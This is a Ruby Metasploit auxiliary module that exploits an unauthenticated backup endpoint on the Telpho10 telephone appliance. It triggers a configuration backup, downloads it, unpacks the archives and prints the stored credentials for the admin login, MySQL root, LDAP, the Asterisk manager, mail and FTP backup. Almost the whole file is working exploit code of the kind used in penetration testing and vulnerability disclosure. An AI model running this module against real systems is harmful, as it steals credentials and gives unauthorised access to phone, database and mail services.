##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Telpho10 Backup Credentials Dumper',
      'Description'    => %q{
        This module exploits a vulnerability present in all versions of Telpho10 telephone system
        appliance. This module generates a configuration backup of Telpho10,
        downloads the file and dumps the credentials for admin login,
        phpmyadmin, phpldapadmin, etc.
        This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39.
      },
      'Author'         => 'Jan Rude', # Vulnerability Discovery and Metasploit Module
      'License'        => MSF_LICENSE,
      'References'     => ['URL', 'https://github.com/whoot/TelpOWN'],
      'Platform'       => 'linux',
      'Privileged'     => false,
      'DisclosureDate' => 'Sep 2 2016'))

      register_options(
        [
          Opt::RPORT(80)
        ])
  end

  # Used for unpacking backup files
  def untar(tarfile)
    destination = tarfile.split('.tar').first
    FileUtils.mkdir_p(destination)
    File.open(tarfile, 'rb') do |file|
      Rex::Tar::Reader.new(file) do |tar|
        tar.each do |entry|
          dest = File.join destination, entry.full_name
          if entry.file?
            File.open(dest, 'wb') do |f|
              f.write(entry.read)
            end
            File.chmod(entry.header.mode, dest)
          end
        end
      end
    end
    return destination
  end

  # search for credentials in backup file
  def dump_creds(mysql_file)
    file = File.new(mysql_file, 'r')
    while (line = file.gets)
      if line.include? 'adminusername'
        config = [line]
      end
    end
    file.close

    print_status('Login (/telpho/login.php)')
    print_status('-------------------------')
    print_good("Username: #{config.first[/adminusername\',\'(.*?)\'/, 1]}")
    print_good("Password: #{config.first[/adminpassword\',\'(.*?)\'/, 1]}\n")

    print_status('MySQL (/phpmyadmin)')
    print_status('-------------------')
    print_good('Username: root')
    print_good("Password: #{config.first[/dbpassword\',\'(.*?)\'/, 1]}\n")

    print_status('LDAP (/phpldapadmin)')
    print_status('--------------------')
    print_good('Username: cn=admin,dc=localdomain')
    print_good("Password: #{config.first[/ldappassword\',\'(.*?)\'/, 1]}\n")

    print_status('Asterisk MI (port 5038)')
    print_status('-----------------------')
    print_good("Username: #{config.first[/manageruser\',\'(.*?)\'/, 1]}")
    print_good("Password: #{config.first[/managersecret\',\'(.*?)\'/, 1]}\n")

    print_status('Mail configuration')
    print_status('------------------')
    print_good("Mailserver: #{config.first[/ipsmarthost\',\'(.*?)\'/, 1]}")
    print_good("Username:   #{config.first[/mailusername\',\'(.*?)\'/, 1]}")
    print_good("Password:   #{config.first[/mailpassword\',\'(.*?)\'/, 1]}")
    print_good("Mail from:  #{config.first[/mailfrom\',\'(.*?)\'/, 1]}\n")

    print_status('Online Backup')
    print_status('-------------')
    print_good("ID:       #{config.first[/ftpbackupid\',\'(.*?)\'/, 1]}")
    print_good("Password: #{config.first[/ftpbackuppw\',\'(.*?)\'/, 1]}\n")

  end

  def run
    res = send_request_cgi({
      'uri'  => '/telpho/system/backup.php',
      'method' => 'GET'
    })
    if res && res.code == 200
      print_status('Generating backup')
      sleep(1)
    else
      print_error("Could not find vulnerable script. Aborting.")
      return nil
    end

    print_status('Downloading backup')
    res = send_request_cgi({
      'uri'    => '/telpho/temp/telpho10.epb',
      'method' => 'GET'
    })
    if res && res.code == 200
      if res.body.to_s.bytesize == 0
        print_error('0 bytes returned, file does not exist or is empty.')
        return nil
      end

      path = store_loot(
        'telpho10.backup',
        'application/x-compressed',
        datastore['RHOST'],
        res.body,
        'backup.tar'
      )
      print_good("File saved in: #{path}")

      begin
        extracted = untar("#{path}")
        mysql = untar("#{extracted}/mysql.tar")
      rescue
        print_error('Could not unpack files.')
        return nil
      end
      begin
        print_status("Dumping credentials\n")
        dump_creds("#{mysql}/mysql.epb")
      rescue
        print_error('Could not find credential file.')
        return nil
      end
    else
      print_error('Failed to download backup file.')
      return nil
    end
  rescue ::Rex::ConnectionError
    print_error("#{rhost}:#{rport} - Failed to connect")
    return nil
  end
end
